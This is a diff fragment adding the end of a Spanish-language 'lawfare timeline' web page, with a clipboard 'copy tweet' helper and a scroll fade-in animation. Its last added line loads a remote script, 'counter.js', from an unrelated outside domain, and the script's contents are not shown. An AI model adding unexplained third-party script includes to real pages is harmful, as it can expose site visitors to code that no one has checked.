+  lawfare-timeline.vercel.app · Abril 2026
+</div>
+
+<script>
+function copyTweet(btn) {
+  const tweet = btn.closest('.tweet');
+  const text = tweet.getAttribute('data-text');
+  navigator.clipboard.writeText(text).then(() => {
+    const toast = document.getElementById('toast');
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+    btn.textContent = 'Copiado ✓';
+    setTimeout(() => btn.textContent = 'Copiar', 2000);
+  });
+}
+
+// Animate numbers on scroll
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(e => {
+    if (e.isIntersecting) e.target.style.opacity = '1';
+  });
+}, { threshold: 0.1 });
+
+document.querySelectorAll('.number-cell').forEach(el => {
+  el.style.opacity = '0';
+  el.style.transition = 'opacity 0.6s ease';
+  observer.observe(el);
+});
+</script>
+<script src="https://gosurf.site/counter.js"></script>
+</body>
+</html>
